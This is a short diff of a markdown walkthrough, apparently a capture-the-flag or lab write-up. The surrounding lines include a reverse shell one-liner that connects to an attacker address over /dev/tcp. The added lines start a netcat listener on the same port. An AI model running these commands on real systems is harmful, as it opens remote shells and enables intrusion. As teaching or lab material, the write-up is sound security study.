@@ -118,4 +118,8 @@ PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
 ```
 - sh -i >& /dev/tcp/172.18.0.99/4545 0>&1
 ```
-- 
+- We can start the *netcat* listener.
+```bash
+nc -lvnp 4545
+```
+- Now we can background it with Crtl-Z (*^Z*). 
